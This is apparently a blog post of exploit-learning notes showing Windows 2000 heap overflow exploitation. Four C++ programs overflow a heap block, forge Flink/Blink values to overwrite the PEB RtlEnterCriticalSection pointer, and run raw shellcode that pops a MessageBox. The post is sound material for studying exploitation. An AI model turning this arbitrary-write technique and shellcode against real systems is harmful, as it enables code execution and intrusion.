---
title: Exploit Learning Notes 007 Heap Overflow Exploit
description: heap overflow exploit
date: 2020-10-22 16:56:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---

Disclaimer: The experimental environment is Windows 2000

Source: [Moeomu's blog](/posts/exploit-learning-notes-007-heap-overflow-exploit/)

## Disassembly of linked tables

### Theory

- Heap block allocation: "unloading" heap blocks from an empty table
- Block release: chaining blocks into an empty table
- Heap merge: "unload" several heap blocks from the empty table, modify the block header information (size), and then "chain" the new updated blocks into the empty table

> Heap overflow: construct the block header of the next heap overflow block, rewrite the forward and backward pointers in the block header, and then wait for an opportunity to write arbitrary data to any address in memory in sequence when the allocate-release merge operation occurs.

- This opportunity to write arbitrary data to any location is called `DWORD SHOOT/ARBITARY DWORD RESET`.

| target | load | result after rewriting |
|-|-|-|
| function return address in the stack frame | shellcode start address | function return, execute shellcode |
| S.E.H handle in stack frame | shellcode start address | shellcode to be executed when exception occurs |
| important function call address | shellcode start address | shellcode executed when function is called

### Practice

#### Code

```CPP
#include <windows.h>
int main()
{
    HLOCAL h1, h2,h3,h4,h5,h6;
    HANDLE hp;
    hp = HeapCreate(0,0x1000,0x10000);
    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
    h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
    h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
    h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
    h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
    _asm int 3//used to break the process
    //free the odd blocks to prevent coalesing
    HeapFree(hp,0,h1);
    HeapFree(hp,0,h3);
    HeapFree(hp,0,h5); //now freelist[2] got 3 entries
    //will allocate from freelist[2] which means unlink the last entry
    //(h5)
    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
    return 0;
}
```

#### found

- At the time of h1 application to h5 space, if at this time h5 has been overflowed to cover Blink and Flink, then it will write [Flink] to [Blink]

### Code implantation

#### Principle

- Target the PEB synchronization function pointer RtlEnterCriticalSection of the ExitProcess call, and execute the shellcode after the exception is raised by the heap overflow within the program

#### Code Example 1 (Observe Exception)

```CPP
#include <windows.h>
char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x16\x01\x1A\x00\x00\x10\x00\x00"
"\x88\x06\x36\x00" // ShellCode起始地址
"\x20\xF0\xFD\x7F"; // PEB同步函数指针位置

int main()
{
    HLOCAL h1 = 0, h2 = 0;
    HANDLE hp;
    hp = HeapCreate(0,0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
    __asm int 3 //used to break process
    memcpy(h1, shellcode, 0x200); //overflow,0x200=512
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    return 0;
}
```

#### mind

- Just short of ShellCode content

#### Code example 2 (incomplete)

```CPP
#include <windows.h>
char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
// 200 字节堆区结束，以下是溢出数据
"\x16\x01\x1A\x00\x00\x10\x00\x00" // 下一个堆块的块首，保留
"\x88\x06\x36\x00" // ShellCode起始地址
"\x20\xF0\xFD\x7F"; // PEB同步函数指针位置

int main()
{
    HLOCAL h1 = 0, h2 = 0;
    HANDLE hp;
    hp = HeapCreate(0,0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
    __asm int 3 //used to break process
    memcpy(h1, shellcode, 0x200); //overflow,0x200=512
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    return 0;
}
```

#### Summary

- This time, some important parameters of the shellcode are written, but the main content is not yet written

#### Code example 3 (problematic)

```CPP
#include <windows.h>
char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
// Do Something...
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
// 200 字节堆区结束，以下是溢出数据
"\x16\x01\x1A\x00\x00\x10\x00\x00" // 下一个堆块的块首，保留
"\x88\x06\x36\x00" // ShellCode起始地址
"\x20\xF0\xFD\x7F"; // PEB同步函数指针位置

int main()
{
    HLOCAL h1 = 0, h2 = 0;
    HANDLE hp;
    hp = HeapCreate(0,0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
    // __asm int 3 //used to break process
    memcpy(h1, shellcode, 0x200); //overflow,0x200=512
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    return 0;
}
```

#### Summary

- This is the complete ShellCode, which can successfully use the heap overflow of Win2000
- But the problem is that the MessageBox cannot be popped up successfully.
- The reason is that the PEB pointer is spoofed together with the ShellCode, so you need to fix the PEB pointer.

#### Code example 4 (complete)

```CPP
#include <windows.h>
char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
//repaire the pointer which shooted by heap over run
"\xB8\x20\xF0\xFD\x7F" //MOV EAX,7FFDF020
"\xBB\x4C\xAA\xF8\x77" //MOV EBX,77F8AA4C the address may releated to
//your OS
"\x89\x18"//MOV DWORD PTR DS:[EAX],EBX
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
// 200 字节堆区结束，以下是溢出数据
"\x16\x01\x1A\x00\x00\x10\x00\x00" // 下一个堆块的块首，保留
"\x88\x06\x36\x00" // ShellCode起始地址
"\x20\xF0\xFD\x7F"; // PEB同步函数指针位置

int main()
{
    HLOCAL h1 = 0, h2 = 0;
    HANDLE hp;
    hp = HeapCreate(0,0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
    // __asm int 3 //used to break process
    memcpy(h1, shellcode, 0x200); //overflow,0x200=512
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    return 0;
}
```

#### Summary

- This is the complete ShellCode, you can successfully use Win2000's heap overflow to pop up MessageBox
